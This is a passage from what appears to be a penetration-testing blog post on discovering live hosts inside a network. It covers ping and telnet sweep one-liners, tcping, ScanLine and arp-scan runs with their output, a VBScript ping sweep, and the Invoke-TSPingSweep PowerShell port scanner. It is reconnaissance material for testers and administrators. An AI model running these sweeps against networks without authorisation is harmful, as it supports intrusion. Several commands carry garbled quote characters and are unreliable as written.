    SHARING<br>*timeout (normal end of scan)<br></code></pre></td></tr></table></figure><h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><blockquote><p>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I |findstr â€œTTLâ€ time to live</p><p>for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep â€œttlâ€|awk -F â€œ[ :]+â€ â€˜{print $4}â€™; done //linux</p></blockquote><h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><blockquote><p>for /l %a in (1,1,254) do start /min /low telnet 192.168.7.%a 445</p></blockquote><h3 id="TCPing"><a href="#TCPing" class="headerlink" title="TCPing"></a>TCPing</h3><p><a href="https://elifulkerson.com/projects/tcping.php">TCPing</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">tcping.exe -n 1 192.168.7.7 445<br><br>Probing 192.168.7.7:445/tcp - Port is open - time=1.719ms<br>Ping statistics for 192.168.7.7:445<br>     1 probes sent.<br>     1 successful, 0 failed.  (0.00% fail)<br>Approximate trip times in milli-seconds:<br>     Minimum = 1.719ms, Maximum = 1.719ms, Average = 1.719ms<br></code></pre></td></tr></table></figure><h3 id="scanline"><a href="#scanline" class="headerlink" title="scanline"></a>scanline</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">scanline.exe -n 192.168.7.0-255<br>ScanLine (TM) 1.01<br>Copyright (c) Foundstone, Inc. 2002<br>http://www.foundstone.com<br>Scan of 256 IPs started at Tue Feb 23 22:07:40 2021<br>-------------------------------------------------------------------------------<br>192.168.7.7<br>Responded in 0 ms.<br>0 hops away<br>Responds with ICMP unreachable: No<br>-------------------------------------------------------------------------------<br>192.168.7.107<br>Responded in 0 ms.<br>0 hops away<br>Responds with ICMP unreachable: No<br>-------------------------------------------------------------------------------<br>192.168.7.110<br>Responded in 0 ms.<br>0 hops away<br>Responds with ICMP unreachable: No<br>-------------------------------------------------------------------------------<br>Scan finished at Tue Feb 23 22:07:49 2021<br>3 IPs and 0 ports scanned in 0 hours 0 mins 9.16 secs<br></code></pre></td></tr></table></figure><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p><a href="https://github.com/QbsuranAlang/arp-scan-windows-">arp-scan-windows</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">arp-scan.exe -t 192.168.7.0/24<br>Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 11.278300<br>Reply that 00:0C:29:1D:82:CF is 192.168.7.7 in 16.140500<br>Reply that 00:0C:29:A9:62:98 is 192.168.7.107 in 15.233500<br>Reply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.080700<br>Reply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.071500<br></code></pre></td></tr></table></figure><h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vbs">strSubNet = <span class="hljs-string">&quot;192.168.7.&quot;</span><br><span class="hljs-keyword">Set</span> objFSO= <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>)<br><span class="hljs-keyword">Set</span> objTS = objfso.CreateTextFile(<span class="hljs-string">&quot;C:\Result.txt&quot;</span>)<br><span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-number">254</span><br>strComputer = strSubNet &amp; i<br>blnResult = Ping(strComputer)<br><span class="hljs-keyword">If</span> blnResult = <span class="hljs-literal">True</span> <span class="hljs-keyword">Then</span><br>objTS.WriteLine strComputer &amp; <span class="hljs-string">&quot; is alived ! :) &quot;</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Next</span><br>objTS.Close<br>WScript.Echo <span class="hljs-string">&quot;All Ping Scan , All Done ! :) &quot;</span><br><span class="hljs-keyword">Function</span> Ping(strComputer)<br><span class="hljs-keyword">Set</span> objWMIService = <span class="hljs-built_in">GetObject</span>(<span class="hljs-string">&quot;winmgmts:\\.\root\cimv2&quot;</span>)<br><span class="hljs-keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="hljs-string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="hljs-string">&quot;&#x27;&quot;</span>)<br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> objItem <span class="hljs-keyword">In</span> colItems<br><span class="hljs-keyword">Select</span> <span class="hljs-keyword">case</span> objItem.StatusCode<br><span class="hljs-keyword">Case</span> <span class="hljs-number">0</span><br>Ping = <span class="hljs-literal">True</span><br><span class="hljs-keyword">Case</span> <span class="hljs-keyword">Else</span><br>Ping = <span class="hljs-literal">False</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">select</span><br><span class="hljs-keyword">Exit</span> <span class="hljs-keyword">For</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br></code></pre></td></tr></table></figure><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p><code>Invoke-TSPingSweep.ps1</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Invoke-TSPingSweep</span></span> &#123;<br>  <span class="hljs-comment">&lt;#</span><br><span class="hljs-comment">    <span class="hljs-doctag">.SYNOPSIS</span></span><br><span class="hljs-comment">    Scan IP-Addresses, Ports and HostNames</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.DESCRIPTION</span></span><br><span class="hljs-comment">    Scan for IP-Addresses, HostNames and open Ports in your Network.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER StartAddress</span></span><br><span class="hljs-comment">    StartAddress Range</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER EndAddress</span></span><br><span class="hljs-comment">    EndAddress Range</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER ResolveHost</span></span><br><span class="hljs-comment">    Resolve HostName</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER ScanPort</span></span><br><span class="hljs-comment">    Perform a PortScan</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER Ports</span></span><br><span class="hljs-comment">    Ports That should be scanned, default values are: 21,22,23,53,69,71,80,98,110,139,111,</span><br><span class="hljs-comment">    389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,</span><br><span class="hljs-comment">    5801,5900,5555,5901</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER TimeOut</span></span><br><span class="hljs-comment">    Time (in MilliSeconds) before TimeOut, Default set to 100</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort -TimeOut 500</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort -Port 80</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.LINK</span></span><br><span class="hljs-comment">    http://www.truesec.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.NOTES</span></span><br><span class="hljs-comment">    Goude 2012, TrueSec</span><br><span class="hljs-comment">  #&gt;</span><br>  <span class="hljs-keyword">Param</span>(<br>    [<span class="hljs-type">parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$true</span>,<br>      <span class="hljs-type">Position</span> = <span class="hljs-number">0</span>)]<br>    [<span class="hljs-type">ValidatePattern</span>(<span class="hljs-string">&quot;\b\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\b&quot;</span>)]<br>    [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$StartAddress</span>,<br>    [<span class="hljs-type">parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$true</span>,<br>      <span class="hljs-type">Position</span> = <span class="hljs-number">1</span>)]<br>    [<span class="hljs-type">ValidatePattern</span>(<span class="hljs-string">&quot;\b\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\b&quot;</span>)]<br>    [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$EndAddress</span>,<br>    [<span class="hljs-type">switch</span>]<span class="hljs-variable">$ResolveHost</span>,<br>    [<span class="hljs-type">switch</span>]<span class="hljs-variable">$ScanPort</span>,<br>    [<span class="hljs-built_in">int</span>[]]<span class="hljs-variable">$Ports</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">53</span>,<span class="hljs-number">69</span>,<span class="hljs-number">71</span>,<span class="hljs-number">80</span>,<span class="hljs-number">98</span>,<span class="hljs-number">110</span>,<span class="hljs-number">139</span>,<span class="hljs-number">111</span>,<span class="hljs-number">389</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">1080</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">2001</span>,<span class="hljs-number">2049</span>,<span class="hljs-number">3001</span>,<span class="hljs-number">3128</span>,<span class="hljs-number">5222</span>,<span class="hljs-number">6667</span>,<span class="hljs-number">6868</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">7878</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">5801</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">5555</span>,<span class="hljs-number">5901</span>),<br>    [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$TimeOut</span> = <span class="hljs-number">100</span><br>  )<br>  <span class="hljs-keyword">Begin</span> &#123;<br>    <span class="hljs-variable">$ping</span> = <span class="hljs-built_in">New-Object</span> System.Net.Networkinformation.Ping<br>  &#125;<br>  <span class="hljs-keyword">Process</span> &#123;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>])) &#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$b</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">2</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">2</span>])) &#123;<br>          <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$d</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>])) &#123;<br>            <span class="hljs-built_in">write-progress</span> <span class="hljs-literal">-activity</span> PingSweep <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span> <span class="hljs-literal">-percentcomplete</span> ((<span class="hljs-variable">$d</span>/(<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>])) * <span class="hljs-number">100</span>)<br>            <span class="hljs-variable">$pingStatus</span> = <span class="hljs-variable">$ping</span>.Send(<span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span>,<span class="hljs-variable">$TimeOut</span>)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pingStatus</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Success&quot;</span>) &#123;<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ResolveHost</span>) &#123;<br>                <span class="hljs-built_in">write-progress</span> <span class="hljs-literal">-activity</span> ResolveHost <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span> <span class="hljs-literal">-percentcomplete</span> ((<span class="hljs-variable">$d</span>/(<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>])) * <span class="hljs-number">100</span>) <span class="hljs-literal">-Id</span> <span class="hljs-number">1</span><br>                <span class="hljs-variable">$getHostEntry</span> = [<span class="hljs-type">Net.DNS</span>]::BeginGetHostEntry(<span class="hljs-variable">$pingStatus</span>.Address, <span class="hljs-variable">$null</span>, <span class="hljs-variable">$null</span>)<br>              &#125;<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ScanPort</span>) &#123;<br>                <span class="hljs-variable">$openPorts</span> = <span class="hljs-selector-tag">@</span>()<br>                <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-le</span> <span class="hljs-variable">$ports</span>.Count;<span class="hljs-variable">$i</span>++) &#123;<br>                  <span class="hljs-variable">$port</span> = <span class="hljs-variable">$Ports</span>[(<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>)]<br>                  <span class="hljs-built_in">write-progress</span> <span class="hljs-literal">-activity</span> PortScan <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span> <span class="hljs-literal">-percentcomplete</span> ((<span class="hljs-variable">$i</span>/(<span class="hljs-variable">$Ports</span>.Count)) * <span class="hljs-number">100</span>) <span class="hljs-literal">-Id</span> <span class="hljs-number">2</span><br>                  <span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TcpClient<br>                  <span class="hljs-variable">$beginConnect</span> = <span class="hljs-variable">$client</span>.BeginConnect(<span class="hljs-variable">$pingStatus</span>.Address,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$null</span>,<span class="hljs-variable">$null</span>)<br>                  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$client</span>.Connected) &#123;<br>                    <span class="hljs-variable">$openPorts</span> += <span class="hljs-variable">$port</span><br>                  &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment"># Wait</span><br>                    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milli</span> <span class="hljs-variable">$TimeOut</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$client</span>.Connected) &#123;<br>                      <span class="hljs-variable">$openPorts</span> += <span class="hljs-variable">$port</span><br>                    &#125;<br>                  &#125;<br>                  <span class="hljs-variable">$client</span>.Close()<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ResolveHost</span>) &#123;<br>                <span class="hljs-variable">$hostName</span> = ([<span class="hljs-type">Net.DNS</span>]::EndGetHostEntry([<span class="hljs-type">IAsyncResult</span>]<span class="hljs-variable">$getHostEntry</span>)).HostName<br>              &#125;<br>              <span class="hljs-comment"># Return Object</span><br>              <span class="hljs-built_in">New-Object</span> PSObject <span class="hljs-literal">-Property</span> <span class="hljs-selector-tag">@</span>&#123;<br>                IPAddress = <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span>;<br>                HostName = <span class="hljs-variable">$hostName</span>;<br>                Ports = <span class="hljs-variable">$openPorts</span><br>              &#125; | <span class="hljs-built_in">Select-Object</span> IPAddress, HostName, Ports<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">End</span> &#123;<br>  &#125;<br>&#125;<br><span class="hljs-comment"># SIG # Begin signature block</span><br><span class="hljs-comment"># MIINGAYJKoZIhvcNAQcCoIINCTCCDQUCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB</span><br><span class="hljs-comment"># gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR</span><br><span class="hljs-comment"># AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUDtjslARLrEIY+LjC2tihCYoE</span><br><span class="hljs-comment"># ax2gggpaMIIFIjCCBAqgAwIBAgIQAupQIxjzGlMFoE+9rHncOTANBgkqhkiG9w0B</span><br><span class="hljs-comment"># AQsFADByMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYD</span><br><span class="hljs-comment"># VQQLExB3d3cuZGlnaWNlcnQuY29tMTEwLwYDVQQDEyhEaWdpQ2VydCBTSEEyIEFz</span><br><span class="hljs-comment"># c3VyZWQgSUQgQ29kZSBTaWduaW5nIENBMB4XDTE0MDcxNzAwMDAwMFoXDTE1MDcy</span><br><span class="hljs-comment"># MjEyMDAwMFowaTELMAkGA1UEBhMCQ0ExCzAJBgNVBAgTAk9OMREwDwYDVQQHEwhI</span><br><span class="hljs-comment"># YW1pbHRvbjEcMBoGA1UEChMTRGF2aWQgV2F5bmUgSm9obnNvbjEcMBoGA1UEAxMT</span><br><span class="hljs-comment"># RGF2aWQgV2F5bmUgSm9obnNvbjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC</span><br><span class="hljs-comment"># ggEBAM3+T+61MoGxUHnoK0b2GgO17e0sW8ugwAH966Z1JIzQvXFa707SZvTJgmra</span><br><span class="hljs-comment"># ZsCn9fU+i9KhC0nUpA4hAv/b1MCeqGq1O0f3ffiwsxhTG3Z4J8mEl5eSdcRgeb+1</span><br><span class="hljs-comment"># jaKI3oHkbX+zxqOLSaRSQPn3XygMAfrcD/QI4vsx8o2lTUsPJEy2c0z57e1VzWlq</span><br><span class="hljs-comment"># KHqo18lVxDq/YF+fKCAJL57zjXSBPPmb/sNj8VgoxXS6EUAC5c3tb+CJfNP2U9vV</span><br><span class="hljs-comment"># oy5YeUP9bNwq2aXkW0+xZIipbJonZwN+bIsbgCC5eb2aqapBgJrgds8cw8WKiZvy</span><br><span class="hljs-comment"># Zx2qT7hy9HT+LUOI0l0K0w31dF8CAwEAAaOCAbswggG3MB8GA1UdIwQYMBaAFFrE</span><br><span class="hljs-comment"># uXsqCqOl6nEDwGD5LfZldQ5YMB0GA1UdDgQWBBTnMIKoGnZIswBx8nuJckJGsFDU</span><br><span class="hljs-comment"># lDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMwdwYDVR0fBHAw</span><br><span class="hljs-comment"># bjA1oDOgMYYvaHR0cDovL2NybDMuZGlnaWNlcnQuY29tL3NoYTItYXNzdXJlZC1j</span><br><span class="hljs-comment"># cy1nMS5jcmwwNaAzoDGGL2h0dHA6Ly9jcmw0LmRpZ2ljZXJ0LmNvbS9zaGEyLWFz</span><br><span class="hljs-comment"># c3VyZWQtY3MtZzEuY3JsMEIGA1UdIAQ7MDkwNwYJYIZIAYb9bAMBMCowKAYIKwYB</span><br><span class="hljs-comment"># BQUHAgEWHGh0dHBzOi8vd3d3LmRpZ2ljZXJ0LmNvbS9DUFMwgYQGCCsGAQUFBwEB</span><br><span class="hljs-comment"># BHgwdjAkBggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tME4GCCsG</span><br><span class="hljs-comment"># AQUFBzAChkJodHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRTSEEy</span><br><span class="hljs-comment"># QXNzdXJlZElEQ29kZVNpZ25pbmdDQS5jcnQwDAYDVR0TAQH/BAIwADANBgkqhkiG</span><br><span class="hljs-comment"># 9w0BAQsFAAOCAQEAVlkBmOEKRw2O66aloy9tNoQNIWz3AduGBfnf9gvyRFvSuKm0</span><br><span class="hljs-comment"># Zq3A6lRej8FPxC5Kbwswxtl2L/pjyrlYzUs+XuYe9Ua9YMIdhbyjUol4Z46jhOrO</span><br><span class="hljs-comment"># TDl18txaoNpGE9JXo8SLZHibwz97H3+paRm16aygM5R3uQ0xSQ1NFqDJ53YRvOqT</span><br><span class="hljs-comment"># 60/tF9E8zNx4hOH1lw1CDPu0K3nL2PusLUVzCpwNunQzGoZfVtlnV2x4EgXyZ9G1</span><br><span class="hljs-comment"># x4odcYZwKpkWPKA4bWAG+Img5+dgGEOqoUHh4jm2IKijm1jz7BRcJUMAwa2Qcbc2</span><br><span class="hljs-comment"># ttQbSj/7xZXL470VG3WjLWNWkRaRQAkzOajhpTCCBTAwggQYoAMCAQICEAQJGBtf</span><br><span class="hljs-comment"># 1btmdVNDtW+VUAgwDQYJKoZIhvcNAQELBQAwZTELMAkGA1UEBhMCVVMxFTATBgNV</span><br><span class="hljs-comment"># BAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTEkMCIG</span><br><span class="hljs-comment"># A1UEAxMbRGlnaUNlcnQgQXNzdXJlZCBJRCBSb290IENBMB4XDTEzMTAyMjEyMDAw</span><br><span class="hljs-comment"># MFoXDTI4MTAyMjEyMDAwMFowcjELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lD</span><br><span class="hljs-comment"># ZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTExMC8GA1UEAxMoRGln</span><br><span class="hljs-comment"># aUNlcnQgU0hBMiBBc3N1cmVkIElEIENvZGUgU2lnbmluZyBDQTCCASIwDQYJKoZI</span><br><span class="hljs-comment"># hvcNAQEBBQADggEPADCCAQoCggEBAPjTsxx/DhGvZ3cH0wsxSRnP0PtFmbE620T1</span><br><span class="hljs-comment"># f+Wondsy13Hqdp0FLreP+pJDwKX5idQ3Gde2qvCchqXYJawOeSg6funRZ9PG+ykn</span><br><span class="hljs-comment"># x9N7I5TkkSOWkHeC+aGEI2YSVDNQdLEoJrskacLCUvIUZ4qJRdQtoaPpiCwgla4c</span><br><span 